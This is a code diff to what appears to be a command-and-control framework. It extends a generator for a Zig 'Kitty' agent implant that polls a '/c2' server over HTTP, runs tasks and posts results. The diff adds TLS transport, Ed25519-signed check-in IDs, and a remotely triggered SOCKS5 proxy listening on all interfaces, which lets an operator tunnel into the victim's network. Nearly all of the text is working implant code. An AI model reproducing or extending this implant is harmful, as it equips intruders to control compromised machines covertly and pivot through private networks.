@@ -18,9 +18,56 @@ const PREFIX = "__PREFIX__";
 const CID = "__CID__";
 const POLL_BASE: u64 = __POLL__;
 const UA = "__UA__";
+const USE_SSL = __USE_SSL__;
+// 64 hex chars = 32-byte Ed25519 seed; empty = no signature
+const ED25519_SEED_HEX = "__ED25519_SEED_HEX__";
+
+var g_socks_running: std.atomic.Value(bool) = .init(false);
+var g_socks_port: std.atomic.Value(u16) = .init(1080);
 
 fn sleepSecs(secs: u64) void {
     std.Thread.sleep(secs * std.time.ns_per_s);
+}
+
+fn hexNibble(c: u8) ?u8 {
+    return switch (c) {
+        '0'...'9' => c - '0',
+        'a'...'f' => c - 'a' + 10,
+        'A'...'F' => c - 'A' + 10,
+        else => null,
+    };
+}
+
+fn parseSeedHex(hex: []const u8) ?[32]u8 {
+    if (hex.len != 64) return null;
+    var out: [32]u8 = undefined;
+    var i: usize = 0;
+    while (i < 32) : (i += 1) {
+        const hi = hexNibble(hex[i * 2]) orelse return null;
+        const lo = hexNibble(hex[i * 2 + 1]) orelse return null;
+        out[i] = (hi << 4) | lo;
+    }
+    return out;
+}
+
+fn signCid(allocator: mem.Allocator) ?[]u8 {
+    const seed = parseSeedHex(ED25519_SEED_HEX) orelse return null;
+    const Ed25519 = std.crypto.sign.Ed25519;
+    const kp = Ed25519.KeyPair.generateDeterministic(seed) catch return null;
+    const sig = kp.sign(CID, null) catch return null;
+    const bytes = sig.toBytes();
+    const enc = base64.url_safe_no_pad.Encoder;
+    const out = allocator.alloc(u8, enc.calcSize(bytes.len)) catch return null;
+    _ = enc.encode(out, &bytes);
+    return out;
+}
+
+fn buildPollPath(allocator: mem.Allocator, which: []const u8) ![]u8 {
+    if (signCid(allocator)) |sig| {
+        defer allocator.free(sig);
+        return try std.fmt.allocPrint(allocator, "{s}/{s}?id={s}&sig={s}", .{ PREFIX, which, CID, sig });
+    }
+    return try std.fmt.allocPrint(allocator, "{s}/{s}?id={s}", .{ PREFIX, which, CID });
 }
 
 fn b64Encode(allocator: mem.Allocator, data: []const u8) ![]u8 {
@@ -37,7 +84,7 @@ fn b64Decode(allocator: mem.Allocator, data: []const u8) ![]u8 {
     return out;
 }
 
-fn httpExchange(allocator: mem.Allocator, method: []const u8, path_q: []const u8, body: ?[]const u8) ![]u8 {
+fn httpExchangePlain(allocator: mem.Allocator, method: []const u8, path_q: []const u8, body: ?[]const u8) ![]u8 {
     var stream = try std.net.tcpConnectToHost(allocator, HOST, PORT);
     defer stream.close();
 
@@ -98,6 +145,35 @@ fn httpExchange(allocator: mem.Allocator, method: []const u8, path_q: []const u8
         return owned;
     }
     return raw;
+}
+
+fn httpExchangeTls(allocator: mem.Allocator, method: []const u8, path_q: []const u8, body: ?[]const u8) ![]u8 {
+    var client = std.http.Client{ .allocator = allocator };
+    defer client.deinit();
+    const url = try std.fmt.allocPrint(allocator, "https://{s}:{d}{s}", .{ HOST, PORT, path_q });
+    defer allocator.free(url);
+
+    var aw: std.Io.Writer.Allocating = .init(allocator);
+    defer aw.deinit();
+
+    const method_e: std.http.Method = if (mem.eql(u8, method, "POST")) .POST else .GET;
+    _ = try client.fetch(.{
+        .location = .{ .url = url },
+        .method = method_e,
+        .payload = body,
+        .response_writer = &aw.writer,
+        .keep_alive = false,
+        .headers = .{
+            .user_agent = .{ .override = UA },
+            .content_type = if (body != null) .{ .override = "application/json" } else .default,
+        },
+    });
+    return try allocator.dupe(u8, aw.written());
+}
+
+fn httpExchange(allocator: mem.Allocator, method: []const u8, path_q: []const u8, body: ?[]const u8) ![]u8 {
+    if (USE_SSL) return httpExchangeTls(allocator, method, path_q, body);
+    return httpExchangePlain(allocator, method, path_q, body);
 }
 
 fn jStr(obj: json.Value, key: []const u8) ?[]const u8 {
@@ -165,6 +241,99 @@ const TaskResult = struct {
 
 fn emptyFiles(allocator: mem.Allocator) ![]u8 {
     return try allocator.dupe(u8, "[]");
+}
+
+fn socksRelay(a: std.net.Stream, b: std.net.Stream) void {
+    var buf: [8192]u8 = undefined;
+    while (true) {
+        const n = a.read(buf[0..]) catch break;
+        if (n == 0) break;
+        b.writeAll(buf[0..n]) catch break;
+    }
+}
+
+fn handleSocksClient(client: std.net.Stream) void {
+    defer client.close();
+    var buf: [512]u8 = undefined;
+
+    // greeting
+    const n0 = client.read(buf[0..2]) catch return;
+    if (n0 < 2 or buf[0] != 0x05) return;
+    const nmethods = buf[1];
+    if (nmethods > 0) _ = client.read(buf[0..nmethods]) catch return;
+    // no auth
+    client.writeAll(&[_]u8{ 0x05, 0x00 }) catch return;
+
+    // request header
+    const n1 = client.read(buf[0..4]) catch return;
+    if (n1 < 4 or buf[0] != 0x05 or buf[1] != 0x01) return; // CONNECT only
+    const atyp = buf[3];
+
+    var host_storage: [256]u8 = undefined;
+    var host: []const u8 = undefined;
+    if (atyp == 0x01) { // IPv4
+        _ = client.read(buf[0..4]) catch return;
+        host = std.fmt.bufPrint(&host_storage, "{d}.{d}.{d}.{d}", .{ buf[0], buf[1], buf[2], buf[3] }) catch return;
+    } else if (atyp == 0x03) { // domain
+        _ = client.read(buf[0..1]) catch return;
+        const dlen = buf[0];
+        if (dlen == 0 or dlen > host_storage.len) return;
+        _ = client.read(host_storage[0..dlen]) catch return;
+        host = host_storage[0..dlen];
+    } else {
+        return;
+    }
+    _ = client.read(buf[0..2]) catch return;
+    const port: u16 = (@as(u16, buf[0]) << 8) | buf[1];
+
+    const alloc = std.heap.page_allocator;
+    var remote = std.net.tcpConnectToHost(alloc, host, port) catch {
+        client.writeAll(&[_]u8{ 0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }) catch {};
+        return;
+    };
+    defer remote.close();
+    client.writeAll(&[_]u8{ 0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }) catch return;
+
+    const t = std.Thread.spawn(.{}, socksRelay, .{ remote, client }) catch {
+        socksRelay(client, remote);
+        return;
+    };
+    defer t.join();
+    socksRelay(client, remote);
+}
+
+fn socksServerMain() void {
+    const port = g_socks_port.load(.seq_cst);
+    const addr = std.net.Address.parseIp4("0.0.0.0", port) catch return;
+    var server = addr.listen(.{ .reuse_address = true }) catch return;
+    defer server.deinit();
+    while (g_socks_running.load(.seq_cst)) {
+        const conn = server.accept() catch {
+            std.Thread.sleep(100 * std.time.ns_per_ms);
+            continue;
+        };
+        const thr = std.Thread.spawn(.{}, handleSocksClient, .{conn.stream}) catch {
+            conn.stream.close();
+            continue;
+        };
+        thr.detach();
+    }
+}
+
+fn startSocks(port: u16) bool {
+    if (g_socks_running.load(.seq_cst)) return true;
+    g_socks_port.store(if (port == 0) 1080 else port, .seq_cst);
+    g_socks_running.store(true, .seq_cst);
+    const thr = std.Thread.spawn(.{}, socksServerMain, .{}) catch {
+        g_socks_running.store(false, .seq_cst);
+        return false;
+    };
+    thr.detach();
+    return true;
+}
+
+fn stopSocks() void {
+    g_socks_running.store(false, .seq_cst);
 }
 
 fn jsonEscapeAppend(list: *std.ArrayList(u8), allocator: mem.Allocator, s: []const u8) !void {
@@ -293,6 +462,29 @@ fn runTask(allocator: mem.Allocator, task: json.Value) !TaskResult {
         };
         allocator.free(out);
         out = try std.fmt.allocPrint(allocator, "OK wrote {s}", .{path});
+    } else if (mem.eql(u8, cmd, "socks_start") or mem.eql(u8, cmd, "socks")) {
+        var port: u16 = 1080;
+        if (jStr(args, "port")) |ps| {
+            port = std.fmt.parseInt(u16, ps, 10) catch 1080;
+        } else if (args == .object) {
+            if (args.object.get("port")) |pv| {
+                port = switch (pv) {
+                    .integer => |i| @intCast(@max(0, i)),
+                    else => 1080,
+                };
+            }
+        }
+        allocator.free(out);
+        if (startSocks(port)) {
+            out = try std.fmt.allocPrint(allocator, "SOCKS5 listening on 0.0.0.0:{d}", .{g_socks_port.load(.seq_cst)});
+        } else {
+            out = try allocator.dupe(u8, "ERROR: failed to start SOCKS5");
+            status = "failed";
+        }
+    } else if (mem.eql(u8, cmd, "socks_stop")) {
+        stopSocks();
+        allocator.free(out);
+        out = try allocator.dupe(u8, "SOCKS5 stop requested");
     } else if (mem.eql(u8, cmd, "exit")) {
         allocator.free(out);
         out = try allocator.dupe(u8, "bye");
@@ -310,7 +502,7 @@ fn postResult(allocator: mem.Allocator, task_id: []const u8, out: []const u8, st
     defer allocator.free(enc);
     const body = buildResultBody(allocator, task_id, enc, status, files_json) catch return;
     defer allocator.free(body);
-    const path = std.fmt.allocPrint(allocator, "{s}/result?id={s}", .{ PREFIX, CID }) catch return;
+    const path = buildPollPath(allocator, "result") catch return;
     defer allocator.free(path);
     const resp = httpExchange(allocator, "POST", path, body) catch return;
     allocator.free(resp);
@@ -333,7 +525,10 @@ pub fn main() !void {
     const allocator = gpa.allocator();
 
     while (true) {
-        const path = try std.fmt.allocPrint(allocator, "{s}/poll?id={s}", .{ PREFIX, CID });
+        const path = buildPollPath(allocator, "poll") catch {
+            sleepSecs(POLL_BASE);
+            continue;
+        };
         defer allocator.free(path);
 
         const body = httpExchange(allocator, "GET", path, null) catch {
@@ -404,12 +599,17 @@ def build_zig_kitty_http_source(
     url_prefix: str = "/c2",
     poll_interval: int = 10,
     user_agent: str = "Mozilla/5.0",
+    ed25519_seed_hex: str = "",
+    use_ssl: bool = False,
 ) -> str:
     """Return Zig source for a typed Kitty agent against reverse_http_polling."""
     prefix = "/" + str(url_prefix or "/c2").strip("/")
     cid = str(client_id or "zigkitty1").replace("\\", "\\\\").replace('"', '\\"')
     h = str(host or "127.0.0.1").replace("\\", "\\\\").replace('"', '\\"')
     ua = str(user_agent or "Mozilla/5.0").replace("\\", "\\\\").replace('"', '\\"')
+    seed = "".join(c for c in str(ed25519_seed_hex or "") if c in "0123456789abcdefABCDEF")
+    if len(seed) not in (0, 64):
+        seed = ""
     return (
         _ZIG_KITTY_TEMPLATE.replace("__HOST__", h)
         .replace("__PORT__", str(int(port or 8088)))
@@ -417,4 +617,6 @@ def build_zig_kitty_http_source(
         .replace("__CID__", cid)
         .replace("__POLL__", str(max(1, int(poll_interval or 10))))
         .replace("__UA__", ua)
+        .replace("__ED25519_SEED_HEX__", seed)
+        .replace("__USE_SSL__", "true" if use_ssl else "false")
     )
